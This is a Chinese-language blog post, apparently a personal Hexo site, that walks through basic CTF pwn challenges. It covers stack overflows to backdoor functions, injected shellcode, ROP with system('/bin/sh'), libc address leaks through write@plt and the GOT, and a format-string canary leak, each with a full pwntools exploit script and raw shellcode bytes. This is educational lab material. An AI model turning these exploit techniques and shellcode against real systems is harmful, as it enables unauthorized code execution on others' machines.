<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  

  
  <title>二进制之ctf基础pwn题 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="##做题大体思路首先可以看看是否有后门函数，有的话，直接通过后门函数拿到shell，若没有，可以选择构造后门函数；若后门函数行不通，可以考虑执行shellcode，但前提是程序没有打开NX保护；若程序开启了canare保护，就不能简单的覆盖栈，必须保证canary不变，可以考虑通过字符串格式化漏洞，找到这个canary的位置，然后再进行操作。">
<meta property="og:type" content="article">
<meta property="og:title" content="二进制之ctf基础pwn题">
<meta property="og:url" content="http://yoursite.com/2019/07/27/二进制之ctf基础pwn题/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="##做题大体思路首先可以看看是否有后门函数，有的话，直接通过后门函数拿到shell，若没有，可以选择构造后门函数；若后门函数行不通，可以考虑执行shellcode，但前提是程序没有打开NX保护；若程序开启了canare保护，就不能简单的覆盖栈，必须保证canary不变，可以考虑通过字符串格式化漏洞，找到这个canary的位置，然后再进行操作。">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://yoursite.com/.com//07/27/二进制之ctf基础pwn题/hi.png">
<meta property="og:updated_time" content="2019-08-05T08:24:33.858Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="二进制之ctf基础pwn题">
<meta name="twitter:description" content="##做题大体思路首先可以看看是否有后门函数，有的话，直接通过后门函数拿到shell，若没有，可以选择构造后门函数；若后门函数行不通，可以考虑执行shellcode，但前提是程序没有打开NX保护；若程序开启了canare保护，就不能简单的覆盖栈，必须保证canary不变，可以考虑通过字符串格式化漏洞，找到这个canary的位置，然后再进行操作。">
<meta name="twitter:image" content="http://yoursite.com/.com//07/27/二进制之ctf基础pwn题/hi.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-二进制之ctf基础pwn题" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/27/二进制之ctf基础pwn题/" class="article-date">
  <time datetime="2019-07-27T07:49:20.000Z" itemprop="datePublished">2019-07-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      二进制之ctf基础pwn题
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>##做题大体思路<br>首先可以看看是否有后门函数，有的话，直接通过后门函数拿到shell，若没有，可以选择构造后门函数；若后门函数行不通，可以考虑执行shellcode，但前提是程序没有打开NX保护；若程序开启了canare保护，就不能简单的覆盖栈，必须保证canary不变，可以考虑通过字符串格式化漏洞，找到这个canary的位置，然后再进行操作。</p>
<a id="more"></a>
<p>##level0</p>
<p>先用checksec查看一下保护机制，发现几乎没什么保护机制，并且是一个64位的程序<br>用ida64打开<br>这个题有一个后门函数callsystm，直接返回一个system(“/bin/sh”)也就是一个命令框，这就是我们想要的，所以不用再构造后门函数<br>脚本如下：<br>     from pwn import*    //导入pwntools工具包<br>     p=remote(‘pwn2.jarvisoj.com’,9881) //建立一个远程连接<br>     callsystem=0x0000000000400596       //后门函数的地址<br>     payload=’a’<em>(0x80+0x8)+p64(callsystem) //用’a’</em>0x80填满buf及以下的空间，一直到ebp，然后用’a’*0x8填满ebp，ebp下面的函数地址就被填入后门函数的返回地址，这里要注意的是32位程序ebp的大小位0x4,64位的是0x8<br>     p.sendlineafter(‘World\n’,payload)   //发送数据<br>     p.interactive()                //将控制权交给用户</p>
<p>##level1</p>
<p>仍旧是用checksec查看，32位，几乎没开保护机制，关键是NX没开，意味着栈上的数据可执行，用ida打开，找到溢出点；<br>这次没有后门函数，但是这个函数却调用了printf函数，输出了buf的地址，再结合着NX保护是关闭的，直接将shellcode写到buf中函数返回时直接跳转到buf位置，就可以执行shellcode，拿到控制权，脚本如下：</p>
<pre><code>from pwn import*
p=remote(&quot;pwn2.jarvisoj.com&quot;,9877)

sh=p.recvline()[14:-2]</code></pre><p>recvline()是接受一行数据,[14:-2]只是python里的一个切片,是”What’sthis:0xffee6c50?”里边的第14个到倒数第二个字符</p>
<pre><code>stack_addr=int(sh,16)</code></pre><p>这里的text为buf的地址，只不过是字符型的，需要int（text，16）用16进制的方法转化为int型</p>
<pre><code>payload=asm(shellcraft.sh()).ljust(0x88)+&quot;A&quot;*4+p32(stack_addr)</code></pre><p>asm(shellcraft.sh())是生成shellcode的，ljust（0x88）是把生成的修剪为长度为0x88的</p>
<pre><code>p.sendline(payload)
p.interactive()</code></pre><p>##level2</p>
<p>首先用checksec查看，这次NX打开了，不能执行shellcode了，用ida打开<br>发现有_system函数，并且有/bin/sh/，可以构造后门函数，将函数返回地址用system的地址覆盖，将传入参数设置成”/bin/sh”,</p>
<pre><code>from pwn import*
p=remote(&apos;pwn2.jarvisoj.com&apos;,9878)
system_addr=0x08048320
sh_addr=0x0804A024
payload = &apos;a&apos; * (0x88 + 0x4) + p32(system_addr) + p32(0) + p32(sh_addr)
p.sendline(payload)
p.interactive()</code></pre><p>‘a’ * (0x88 + 0x4)覆盖buf和rbp<br>p32(system_addr) 传system的地址到函数返回地址<br>p32(0)     覆盖栈底<br>p32(sh_addr) 传”/bin/sh”到system函数</p>
<p>##level2_x64</p>
<p>和32位的思路相同，不同的是，传参的方式不同<br>32位的是直接把参数放入栈里，而64位的是把参数放进寄存器里</p>
<pre><code>from pwn import*
p=remote(&apos;pwn2.jarvisoj.com&apos;,9882)
system_addr=0x00000000004004C0
pop_addr=0x00000000004006b3
sh_addr=0x0000000000600A90
payload = &apos;a&apos; * (0x80 + 0x8)+ p64(pop_addr) + p64(sh_addr)+ p64(system_addr)  
p.send(payload)
p.interactive()</code></pre><p>pop_addr 第一个参数存入的寄存器的地址，rdi的地址<br>p64(pop_addr) + p64(sh_addr)+ p64(system_addr) 先把”/bin/sh”的地址放入寄存器，然后再传入system函数</p>
<p>可用 ROPgadget –binary level2_x64 –only “pop|ret” 指令找到rdi地址</p>
<img src="/.com//07/27/二进制之ctf基础pwn题/hi.png" title="hi">
<p>##level3<br>先知道plt表和got表的一些相关知识。<br>反编译的过程当中，我们经常会发现xxx@plt的函数，因为为了用户体验和cpu的利用率，编译的时候需要两个表来进行辅助，一个是got表另外一个是plt表。<br>plt表是内部函数表，got表是全局函数表，两者是一一对应的关系，网上找到过一张图，描述的很形象。也就是说plt表里面放的是got表的地址，got表里面放的是函数的真实地址。（链接：<a href="https://www.jianshu.com/p/722bcf89c6c2）" target="_blank" rel="noopener">https://www.jianshu.com/p/722bcf89c6c2）</a></p>
<p>这道题，在给出程序的同时，给出了一个libc库；先进行一下安全检查，NX保护打开，但是在程序中却没有发现后门函数，因此，要根据libc库构建一个；通过找libc库中未偏移的write函数地址，和程序中偏移后的write函数地址，得出偏移量，然后从libc库里找system函数和”/bin/sh/“的地址，加上偏移量，得到真正的地址，这样，后门函数构造完成<br>from pwn import*<br>p=remote(“pwn2.jarvisoj.com”,”9879”)<br>elf=ELF(“level3”)<br>plt_write=elf.plt[“write”]<br>main_addr=0x08048484<br>p.recvline()<br>payload = “A” * 0x88 + “A” * 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(elf.got[“write”]) + p32(4)<br>p.send(payload)<br>write_addr=u32(p.recv(4))<br>print “write_addr=”+hex(write_addr)</p>
<p>libc=ELF(“libc-2.19.so”)<br>bss_addr=0x0804a024<br>libc_system=libc.symbols[“system”]<br>libc_binsh=next(libc.search(“/bin/sh”))<br>libc_write=libc.symbols[“write”]</p>
<p>system_addr=write_addr-libc_write+libc_system<br>binsh_addr=write_addr-libc_write+libc_binsh<br>print “system_addr=”+hex(system_addr)</p>
<p>p.recvline()</p>
<p>payload = “A” * 0x88 + “A” * 4 + p32(system_addr) + p32(0) + p32(binsh_addr)<br>p.sendline(payload)<br>p.interactive()</p>
<p>##level3_x64<br>思路和level3相同，不同的仍然是64位和32位的传参区别<br>from pwn import*<br>p=remote(“pwn2.jarvisoj.com”,”9883”)<br>elf=ELF(“level3”)<br>plt_write=0x00000000004004B0<br>main_addr=0x000000000040061A<br>pop_rdi=0x00000000004006b3<br>pop_rsi=0x00000000004006b1<br>p.recvline()<br>payload = “A” * 0x80 + “A” * 8 + p64(pop_rdi)+p64(1) +p64(pop_rsi)+ p64(0x0000000000600A58)+p64(0)+p64(plt_write) + p64(main_addr)<br>p.send(payload)<br>write_addr=u64(p.recv(8))<br>print “write_addr=”+hex(write_addr)<br>print hex(elf.got[“write”])<br>libc_system=0x0000000000046590<br>libc_binsh=0x0000000000180543<br>libc_write=0x00000000000EF3B0</p>
<p>system_addr=write_addr-libc_write+libc_system<br>binsh_addr=write_addr-libc_write+libc_binsh<br>print “system_addr=”+hex(system_addr)</p>
<p>p.recvline()</p>
<p>payload = “A” * 0x80 + “A” * 8 +p64(pop_rdi)+ p64(binsh_addr)+ p64(system_addr) + p64(0)<br>p.sendline(payload)<br>p.interactive()</p>
<p>##pwn1<br>格式化字符串漏洞的远离：<br>格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。</p>
<p>这道题用到的漏洞，字符串格式化漏洞；这里开启了canary保护，没有开启NX，可以执行shellcode<br>这题的思路：首先通过字符串格式化漏洞，泄露出canary在栈中的地址，以便覆盖栈时保证相应的地址canary不变，然后在函数返回地址中填入shellcode的地址，然后把shellcode放入相应的地址<br>from pwn import *</p>
<p>shellcode=”\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xd2\x52\x68\x2f\x2f” <br>    “\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0” <br>    “\x0b\xcd\x80\n”<br>context.log_level=’debug’<br>p=process(“./pwn1”)<br>//p=remote(‘172.16.80.240’,8000)<br>p.recvuntil(‘name:’)<br>p.sendline(‘%p.’<em>40)<br>leak_data=p.recvuntil(‘messages:’)<br>address=leak_data.split(‘.’)<br>for i in range(len(address)):<br>    print str(i)+’:’+str(address[i])<br>canary=address[30]<br>print “canary=”+canary<br>prev_ebp_addr=address[33]<br>print “stack_addr=”+prev_ebp_addr<br>shellcode_addr=int(prev_ebp_addr,16)-144+0x8<br>payload=’a’</em>100+p32(int(canary,16))+’A’*12+p32(shellcode_addr)+shellcode<br>p.sendline(payload)<br>p.interactive()</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/27/二进制之ctf基础pwn题/" data-id="cjyzmx1bx000bqcw0w74tclgk" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/08/06/hello-world/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          Hello World
        
      </div>
    </a>
  
  
    <a href="/2019/07/23/pwntools的安装/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">ubuntu16下 pwntools的安装</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/08/06/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2019/07/27/二进制之ctf基础pwn题/">二进制之ctf基础pwn题</a>
          </li>
        
          <li>
            <a href="/2019/07/23/pwntools的安装/">ubuntu16下 pwntools的安装</a>
          </li>
        
          <li>
            <a href="/2019/07/20/sql注入/">sql注入</a>
          </li>
        
          <li>
            <a href="/2019/07/20/drops夏令营14/">WEB前端安全-XSS与CSRF</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>